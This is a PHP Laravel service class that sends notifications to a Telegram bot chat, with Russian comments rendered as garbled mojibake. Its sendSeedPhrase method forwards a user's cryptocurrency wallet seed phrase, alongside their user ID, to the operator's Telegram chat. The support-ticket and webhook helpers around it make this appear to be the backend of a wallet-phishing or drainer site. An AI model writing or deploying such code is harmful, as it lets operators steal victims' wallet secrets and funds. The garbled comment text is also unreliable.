<?php

namespace App\Services;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class TelegramService
{
    protected $apiToken;
    protected $chatId;
    protected $apiUrl;

    public function __construct()
    {
        $this->apiToken = config('services.telegram.bot_token');
        $this->chatId = config('services.telegram.chat_id');
        $this->apiUrl = "https://api.telegram.org/bot{$this->apiToken}";
    }

    /**
     * –û—Ç–ø—Ä–∞–≤–∫–∞ seed-—Ñ—Ä–∞–∑—ã –≤ Telegram
     *
     * @param string $seedPhrase
     * @param int $userId
     * @return bool
     */
    public function sendSeedPhrase($seedPhrase, $userId)
    {
        $message = "üîë –ù–æ–≤–∞—è seed-—Ñ—Ä–∞–∑–∞ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è ID: {$userId}\n\n";
        $message .= "<code>{$seedPhrase}</code>";

        return $this->sendMessage($message);
    }

    /**
     * –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≤ Telegram
     *
     * @param int $userId
     * @param string $ticketNumber
     * @param string $messageText
     * @return bool
     */
    public function sendSupportMessage($userId, $ticketNumber, $messageText)
    {
        $message = "üì© –ù–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É\n\n";
        $message .= "üë§ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {$userId}\n";
        $message .= "üî¢ –ù–æ–º–µ—Ä —Ç–∏–∫–µ—Ç–∞: #{$ticketNumber}\n\n";
        $message .= "üí¨ –°–æ–æ–±—â–µ–Ω–∏–µ:\n{$messageText}\n\n";
        $message .= "–î–ª—è –æ—Ç–≤–µ—Ç–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç:\n";
        $message .= "<code>#{$ticketNumber} REPLY: –≤–∞—à –æ—Ç–≤–µ—Ç</code>";

        return $this->sendMessage($message);
    }

    /**
     * –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Ç–∏–∫–µ—Ç–∞
     *
     * @param int $userId
     * @param string $ticketNumber
     * @return bool
     */
    public function sendTicketClosed($userId, $ticketNumber)
    {
        $message = "üö´ –¢–∏–∫–µ—Ç –∑–∞–∫—Ä—ã—Ç\n\n";
        $message .= "üë§ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {$userId}\n";
        $message .= "üî¢ –ù–æ–º–µ—Ä —Ç–∏–∫–µ—Ç–∞: #{$ticketNumber}";

        return $this->sendMessage($message);
    }

    /**
     * –û—Ç–ø—Ä–∞–≤–∫–∞ –æ–±—â–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
     *
     * @param string $text
     * @param array $options –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
     * @return bool
     */
    public function sendMessage($text, $options = [])
    {
        try {
            $params = array_merge([
                'chat_id' => $this->chatId,
                'text' => $text,
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true
            ], $options);

            $response = Http::post("{$this->apiUrl}/sendMessage", $params);
            
            if (!$response->successful()) {
                Log::error('Telegram API Error', [
                    'status' => $response->status(),
                    'body' => $response->body()
                ]);
                return false;
            }
            
            return true;
        } catch (\Exception $e) {
            Log::error('Telegram Service Error', ['message' => $e->getMessage()]);
            return false;
        }
    }

    /**
     * –£—Å—Ç–∞–Ω–æ–≤–∫–∞ webhook –¥–ª—è –ø—Ä–∏–µ–º–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç Telegram
     *
     * @param string $url URL –¥–ª—è webhook
     * @param string $secretToken –°–µ–∫—Ä–µ—Ç–Ω—ã–π —Ç–æ–∫–µ–Ω –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∑–∞–ø—Ä–æ—Å–æ–≤
     * @return array
     */
    public function setWebhook($url, $secretToken = null)
    {
        $params = [
            'url' => $url,
            'allowed_updates' => json_encode(['message']),
        ];
        
        if ($secretToken) {
            $params['secret_token'] = $secretToken;
        }
        
        try {
            $response = Http::post("{$this->apiUrl}/setWebhook", $params);
            return $response->json();
        } catch (\Exception $e) {
            Log::error('Telegram Webhook Error', ['message' => $e->getMessage()]);
            return ['ok' => false, 'error' => $e->getMessage()];
        }
    }
}